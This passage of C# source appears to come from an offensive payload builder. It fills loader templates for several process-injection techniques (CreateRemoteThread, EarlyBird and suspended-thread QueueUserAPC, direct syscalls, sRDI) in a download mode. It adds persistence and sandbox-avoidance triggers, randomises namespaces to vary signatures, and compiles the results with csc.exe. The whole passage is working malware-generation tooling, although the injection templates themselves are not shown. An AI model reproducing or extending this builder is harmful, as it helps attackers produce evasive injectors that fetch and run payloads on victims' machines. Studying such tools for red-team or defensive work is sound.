                        return false;
                    }
                }
            }
            else if (injMode == "DOWNLOAD")
            {
                if (injTechnique == "CreateRemoteThread")
                {

                    string CSContents = DLL_CRT.BODY;
                    Regex DLLCRTPattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, REQUIRETRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, HIBERNATETRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, AVOIDTRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            DLLCRTPattern = new Regex("//{{TRIGGER}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, PERSISTTRIGGER);
                            DLLCRTPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = DLLCRTPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    DLLCRTPattern = new Regex("//{{TRIGGER}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, "");

                    DLLCRTPattern = new Regex("//{{MODE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DOWNLOADMODE);
                    DLLCRTPattern = new Regex("{{NAMESPACE}}");
                    CSContents = DLLCRTPattern.Replace(CSContents, GenRandomString());
                    DLLCRTPattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = DLLCRTPattern.Replace(CSContents, DLL_CRT.DOWNLOADARGPARSE);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                } 
                else if (injTechnique == "EarlyBird_QueueUserAPC")
                {
                    string CSContents = EB_QUAPC.BODY;
                    Regex QueuePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIRETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }

                        if (trig == "HIBERNATETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    QueuePattern = new Regex("//{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    QueuePattern = new Regex("//\\{\\{MODE\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DOWNLOADMODE);
                    QueuePattern = new Regex("{{SPAWN}}");
                    CSContents = QueuePattern.Replace(CSContents, "parsedArgs.Spawn");
                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());
                    QueuePattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = QueuePattern.Replace(CSContents, EB_QUAPC.DOWNLOADARGPARSE);


                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "Suspend_QueueUserAPC")
                {
                    string CSContents = Suspend_QueueUserAPC.BODY;
                    Regex QueuePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIRETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATETRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            QueuePattern = new Regex("//{{TRIGGER}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTTRIGGER);
                            QueuePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = QueuePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    QueuePattern = new Regex("//{{TRIGGER}}");
                    CSContents = QueuePattern.Replace(CSContents, "");

                    QueuePattern = new Regex("//{{MODE}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DOWNLOADMODE);

                    QueuePattern = new Regex("{{NAMESPACE}}");
                    CSContents = QueuePattern.Replace(CSContents, GenRandomString());

                    QueuePattern = new Regex("{{ARGS}}");
                    CSContents = QueuePattern.Replace(CSContents, Suspend_QueueUserAPC.DOWNLOADARGPARSE);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, false))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "Syscall_CreateThread")
                {

                    string CSContents = SYSCALL_CT.BODY;
                    Regex syscallPattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, REQUIRETRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }

                        if (trig == "HIBERNATETRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, HIBERNATETRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, AVOIDTRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            syscallPattern = new Regex("//{{TRIGGER}}");
                            CSContents = syscallPattern.Replace(CSContents, PERSISTTRIGGER);
                            syscallPattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = syscallPattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    syscallPattern = new Regex("//{{TRIGGER}}");
                    CSContents = syscallPattern.Replace(CSContents, "");

                    syscallPattern = new Regex("\\{\\{MODE\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DOWNLOAD);
                    syscallPattern = new Regex("{{NAMESPACE}}");
                    CSContents = syscallPattern.Replace(CSContents, GenRandomString());
                    syscallPattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = syscallPattern.Replace(CSContents, SYSCALL_CT.DOWNLOAD_ARGPARSE);
                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else if (injTechnique == "SRDI")
                {
                    string CSContents = sRDI.BODY;

                    Regex replacePattern;
                    foreach (var trig in TriggersToUse)
                    {
                        if (trig == "REQUIRETRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, REQUIRETRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, REQUIREDPROCESSDETAILS);
                        }
                        if (trig == "HIBERNATETRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, HIBERNATETRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, HIBERNATEPROCESSDETAILS);
                        }
                        if (trig == "AVOIDTRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, AVOIDTRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, AVOIDPROCESSDETAILS);
                        }
                        if (trig == "PERSISTTRIGGER")
                        {
                            replacePattern = new Regex("//{{TRIGGER}}");
                            CSContents = replacePattern.Replace(CSContents, PERSISTTRIGGER);
                            replacePattern = new Regex("//{{REQUIREMENTS}}");
                            CSContents = replacePattern.Replace(CSContents, PERSISTPROCESSDETAILS);
                        }
                    }

                    //Clear remaining trigger.
                    replacePattern = new Regex("//{{TRIGGER}}");
                    CSContents = replacePattern.Replace(CSContents, "");

                    replacePattern = new Regex("\\{\\{MODE\\}\\}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DOWNLOADMODE);
                    replacePattern = new Regex("{{NAMESPACE}}");
                    CSContents = replacePattern.Replace(CSContents, GenRandomString());
                    replacePattern = new Regex("//\\{\\{ARGS\\}\\}");
                    CSContents = replacePattern.Replace(CSContents, sRDI.DOWNLOADARGS);

                    if (WriteCS(CSContents, injTechnique, Settings.OutputDirectory, true))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            return false;
        }

        /// <summary>
        /// WriteCS takes the CSContents, and writes it to a .cs file for compilation by CompileCS.
        /// </summary>
        /// <param name="CSContents"> The massive string created by CSConstructor.</param>
        /// <param name="injTechnique">Injection technique selected.</param>
        /// <param name="outDir"> Directory to store output.</param>
        /// <param name="isUnsafe"> whether or not csc.exe's unsafe parameter should be used when passing data to CompileCS</param>
        /// <returns></returns>
        public static bool WriteCS(string CSContents, string injTechnique, string outDir, bool isUnsafe)
        {
            string Output_Path;
            try
            {
                if (!Directory.Exists(outDir + @"\" + injTechnique))
                {
                    Directory.CreateDirectory(outDir + @"\" + injTechnique);
                }
                Output_Path = outDir + @"\" + Settings.SelectedTechnique + @"\" + Path.GetRandomFileName().Split('.')[0] + ".cs"; //File extension is randomly generated, but we just want the base filename.;
                File.WriteAllText(Output_Path, CSContents);
                if (File.Exists(Output_Path))
                {
                    Console.WriteLine("|\n|   [*] Created: {0}", Output_Path);
                    Console.WriteLine("|       SHA256: {0}\n|", BytesToString(CalculateSHA256(Output_Path)));

                    if (Settings.CompileBinary)
                    {
                        if (CompileCS(Output_Path, isUnsafe))
                        {
                            return true;
                        }
                        else
                        {
                            return false;
                        }
                    }
                    return false;
                }
                else
                {
                    return false;
                }

            }
            catch (Exception)
            {
                Console.WriteLine("\n   [!] Unable to create .cs, please build again.");
                return false;
            }
        }


        /// <summary>
        /// Spawns a new csc.exe process to compile the .cs file created by WriteCS;
        /// </summary>
        /// <param name="filepath">The path to the .cs file created by WriteCS</param>
        /// <param name="unsafeCode">whether or not csc.exe's unsafe parameter should be used</param>
        /// <returns></returns>
        public static bool CompileCS(string filepath, bool unsafeCode)
        {
            if (File.Exists(@"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe"))
            {
                try
                {
                    var binaryOutput = filepath.Split('.')[0] + ".exe";
                    var p = new System.Diagnostics.Process();
                    p.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe";
                    if (!unsafeCode)
                    {
                        p.StartInfo.Arguments = string.Format(" -out:{0} {1}", binaryOutput, filepath);
                    }
                    else if (unsafeCode)
                    {
                        p.StartInfo.Arguments = string.Format(" -unsafe -out:{0} {1}", binaryOutput, filepath);
                    }
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    p.StandardOutput.ReadToEnd();
                    
                    if (File.Exists(binaryOutput)) {
                        Console.WriteLine("|   [*] Compiling: {0}", binaryOutput);
                        Console.WriteLine("|       SHA256: {0}\n|", BytesToString(CalculateSHA256(binaryOutput)));
                        
                    }
                    return true;
                }
                catch (Exception) 
                {
                    return false;
                }
            }
            else
            {
                Console.WriteLine("|\n|   [!] Compile Error: C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe not found.");
                return false;
            }
        }

        /// <summary>
        /// Calculates the SHA256 Checksum for the .cs file and binary.
        /// </summary>
        /// <param name="filename"></param>
        /// <returns></returns>
        public static byte[] CalculateSHA256(string filename){
            SHA256 Sha256 = SHA256.Create();
            using (FileStream stream = File.OpenRead(filename))
            {
                return Sha256.ComputeHash(stream);
            }
        }

        /// <summary>
        /// Used to convert the byte[] from CalculateSHA256 to a string.
        /// </summary>
        /// <param name="bytes"></param>
        /// <returns></returns>
        public static string BytesToString(byte[] bytes)
        {
            string result = "";
            foreach (byte b in bytes) result += b.ToString("x2");
            return result;
        }

        /// <summary>
        /// Used for formatting shellcode into a single csv string. Only used in static mode.
        /// </summary>
        /// <param name="ba"></param>
        /// <returns></returns>
        public static string ByteArrayToString(byte[] ba)
        {
            return System.BitConverter.ToString(ba).Replace("-", ", 0x");
        }

        public static string GenRandomString()
        {
            Random random = new Random();
            int length = random.Next(1,9);
            var rString = "";
            for (var i = 0; i < length; i++)
            {
                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
            }
            return rString;
        }
    }
}
